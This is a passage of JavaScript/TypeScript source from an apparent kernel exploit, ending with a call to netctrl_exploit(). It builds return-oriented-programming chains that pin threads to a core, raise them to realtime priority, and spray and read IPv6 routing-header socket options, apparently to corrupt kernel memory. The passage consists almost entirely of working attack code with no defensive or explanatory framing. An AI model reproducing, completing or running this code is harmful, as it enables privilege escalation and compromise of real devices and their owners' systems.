  rop.push(gadgets.POP_RCX_RET)
  rop.push(new BigInt(0x10))                     // setsize
  rop.push(gadgets.POP_R8_RET)
  rop.push(cpu_mask)
  rop.push(cpuset_setaffinity_wrapper)

  const rtprio_buf = malloc(4)
  write16(rtprio_buf, PRI_REALTIME)
  write16(rtprio_buf.add(2), MAIN_RTPRIO)

  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(1))         // RTP_SET
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(0))         // lwpid = 0 (current thread)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(rtprio_buf)
  rop.push(rtprio_thread_wrapper)

  // Signal ready - write 1 to ready_signal
  rop.push(gadgets.POP_RDI_RET)
  rop.push(ready_signal)
  rop.push(gadgets.POP_RAX_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

  const loop_init = rop.length

  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(run_fd)
  rop.push(gadgets.POP_RSI_RET)
  rop.push(signal_buf)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(1))
  rop.push(read_wrapper)

  // writev(uio_sock_1, uioIovRead, UIO_IOV_NUM);
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(uio_sock_1))
  rop.push(gadgets.POP_RSI_RET)
  rop.push(uioIovRead)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(UIO_IOV_NUM))
  rop.push(writev_wrapper)

  // Signal done - write 1 to deletion_signal
  rop.push(gadgets.POP_RDI_RET) // pop rdi ; ret
  rop.push(done_signal)
  rop.push(gadgets.POP_RAX_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

  const loop_end = rop.length
  const loop_size = loop_end - loop_init
  // It's gonna loop

  return {
    rop,
    loop_size
  }
}

function ipv6_sock_spray_and_read_rop (ready_signal: BigInt, run_fd: BigInt, done_signal: BigInt, signal_buf: BigInt) {
  const rop: BigInt[] = []

  rop.push(new BigInt(0)) // first element overwritten by longjmp, skip it

  const cpu_mask = malloc(0x10)
  write16(cpu_mask, 1 << MAIN_CORE)

  // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(3))                        // CPU_LEVEL_WHICH
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(1))                        // CPU_WHICH_TID
  rop.push(gadgets.POP_RDX_RET)
  rop.push(BigInt_Error)   // id = -1 (current thread)
  rop.push(gadgets.POP_RCX_RET)
  rop.push(new BigInt(0x10))                     // setsize
  rop.push(gadgets.POP_R8_RET)
  rop.push(cpu_mask)
  rop.push(cpuset_setaffinity_wrapper)

  const rtprio_buf = malloc(4)
  write16(rtprio_buf, PRI_REALTIME)
  write16(rtprio_buf.add(2), MAIN_RTPRIO)

  // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(1))         // RTP_SET
  rop.push(gadgets.POP_RSI_RET)
  rop.push(new BigInt(0))         // lwpid = 0 (current thread)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(rtprio_buf)
  rop.push(rtprio_thread_wrapper)

  // Signal ready - write 1 to ready_signal
  rop.push(gadgets.POP_RDI_RET)
  rop.push(ready_signal)
  rop.push(gadgets.POP_RAX_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

  const loop_init = rop.length

  // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
  rop.push(gadgets.POP_RDI_RET)
  rop.push(run_fd)
  rop.push(gadgets.POP_RSI_RET)
  rop.push(signal_buf)
  rop.push(gadgets.POP_RDX_RET)
  rop.push(new BigInt(1))
  rop.push(read_wrapper)

  // Spray all sockets
  for (let i = 0; i < ipv6_socks.length; i++) {
    rop.push(gadgets.POP_RDI_RET)
    rop.push(ipv6_socks[i])
    rop.push(gadgets.POP_RSI_RET)
    rop.push(new BigInt(IPPROTO_IPV6))
    rop.push(gadgets.POP_RDX_RET)
    rop.push(new BigInt(IPV6_RTHDR))
    rop.push(gadgets.POP_RCX_RET)
    rop.push(spray_rthdr_rop.add(i * UCRED_SIZE)) // Offset for socket i

    // debug("");
    // debug("Using this buffer " + hex(spray_rthdr_rop.add(i*UCRED_SIZE)) + " : " + hex(read64(spray_rthdr_rop.add(i*UCRED_SIZE))));

    rop.push(gadgets.POP_R8_RET)
    rop.push(new BigInt(spray_rthdr_len))
    rop.push(setsockopt_wrapper)
  }

  // After spraying, read all sockets into buffer array
  for (let i = 0; i < ipv6_socks.length; i++) {
    rop.push(gadgets.POP_RDI_RET)
    rop.push(ipv6_socks[i])
    // debug("");
    // debug("pushed sock: " + hex(ipv6_socks[i]));
    rop.push(gadgets.POP_RSI_RET)
    rop.push(new BigInt(IPPROTO_IPV6))
    rop.push(gadgets.POP_RDX_RET)
    rop.push(new BigInt(IPV6_RTHDR))
    rop.push(gadgets.POP_RCX_RET)
    rop.push(read_rthdr_rop.add(i * 8))  // Offset for socket i
    // debug("Pushing read from add " + hex(read_rthdr_rop.add(i * 8)));
    rop.push(gadgets.POP_R8_RET)
    rop.push(check_len)
    rop.push(getsockopt_wrapper)
  }

  // Signal done - write 1 to deletion_signal
  rop.push(gadgets.POP_RDI_RET) // pop rdi ; ret
  rop.push(done_signal)
  rop.push(gadgets.POP_RAX_RET)
  rop.push(new BigInt(1))
  rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)

  // Exit
  rop.push(gadgets.POP_RDI_RET)
  rop.push(new BigInt(0))
  rop.push(thr_exit_wrapper)

  // It's gonna loop

  return {
    rop,
    loop_size: 0// loop_size
  }
}

netctrl_exploit()
// cleanup();
